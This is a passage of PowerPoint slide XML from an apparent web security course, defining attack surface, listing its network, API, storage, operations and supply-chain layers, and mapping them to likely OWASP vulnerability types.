                <a:cs typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Topic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 03 –</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Aptos Display"/>
                <a:ea typeface="Cambria"/>
              </a:rPr>
              <a:t> Attack Surface, API Gateways &amp; Service Meshes, Layered Security</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Cambria"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16879410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0926E-31D3-034A-4762-BCD8B6F17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F28E0-6AED-A333-132F-3C089C330B6F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Attack Surface</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{96804D60-8475-2D2F-8E88-E90FDF800A5E}"/>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dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>In security terms, your </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>attack surface</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> is:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>The sum of all the points where an attacker could interact with your system – endpoints, interfaces, inputs, protocols, identities – to get access, break something, or steal data.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41314771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030AC-7FDB-6D12-FEB6-F7C75F7F7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FCFDD-13CA-5431-FD09-C9541287133C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Modern Web Attack Surface 01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6DAF25D3-0DA6-84D2-6E4D-37B7199F8051}"/>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dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Network surface</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Open ports, load balancers, ingress controllers, VPNs, bastion hosts.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Cloud edges: API Gateways, WAFs, CDN origins.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="29017184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6DAEF-CB8F-9080-9F08-0B3FF0D2B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BF161-817B-4C34-7CF0-9AEC70785F5E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Modern Web Attack Surface 02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{76C60315-2532-6B42-4BAA-800AFCFA63A7}"/>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dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Application / API surface</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Public HTTP routes (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>/login</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" err="1">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>api</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>/orders</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>/admin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Internal APIs (service-to-service, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>gRPC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, message queues).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>WebSocket endpoints, file uploads, webhooks.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15212116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0E509-977C-48F1-BD33-39B47955C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7138E-42E6-D9A2-ACF8-0E5B5497A3E6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Modern Web Attack Surface 04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A47DCED9-1792-FDBD-76A3-3D18971CBD88}"/>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dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Data &amp; storage surface</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Databases, caches, object stores (S3 buckets, blobs).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Search engines (Elasticsearch), queues, stream processors.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="31857351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603F8-0E72-6FAC-648F-AC104BB8D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E374E-0BDE-7E82-B50C-0E10BBD27F90}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Modern Web Attack Surface 05</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C6BEAF81-86F5-1AC7-D8FC-F9C03947E6DF}"/>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a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Management &amp; ops surface</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Admin UIs, internal tools, feature flag dashboards.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>CI/CD pipelines, build servers, container registries.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Cloud consoles, Kubernetes API server.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38068899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75097-4C7D-937D-3D43-8BAFBA6FF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62F6C-7806-3CD1-C83D-2FD1C2D97793}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Modern Web Attack Surface 06</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C1B11908-F05E-DA95-FADD-490FE5BF25AD}"/>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a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Supply chain surface</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Dependencies, plugins, container base images.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Third-party SaaS integrated via API.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16455234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9D732-14A1-2E2F-DA2C-B776880E1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F7BE4-37CE-4B48-F2C0-F1985E2EAC8D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Key Takeaway</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CE0DCD58-12D7-3A0C-A7C6-D8295EC4457B}"/>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b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Security implication:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>The bigger and less understood</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> your attack surface</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, the easier</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> it is for an attacker to find </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>some</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> bug, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>misconfig</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, or forgotten endpoint to chain into a breach.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="169471980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B1ABF-CFE2-4C44-121E-65944F7A8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ED70F-FCB3-6616-7070-440C3689AB39}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.4 - Mapping OWASP + AS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1442FCC9-8CBA-A73F-6A6B-DBD95CD22B5A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7695323" cy="4692924"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Map attack surface</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>“Where can input enter?”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>“Where can sensitive operations be triggered?”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>“Where is data stored, moved, or transformed?”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5776535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21476-0E11-513C-2E90-B78D3D60E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7353E-8D07-7073-A763-55C93E94D4A5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.4 - Mapping OWASP + AS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DD471FEB-060C-DA21-9F72-35541D99B18D}"/>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b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>2.   Ask: what’s the most likely failure mode (OWASP vulnerability) here?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Public API route → Broken access control? Injection?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Internal service → Over-trusting “internal” traffic? No </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>authz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>S3 bucket → Misconfiguration? Public read/write?</a:t>
            </a:r>
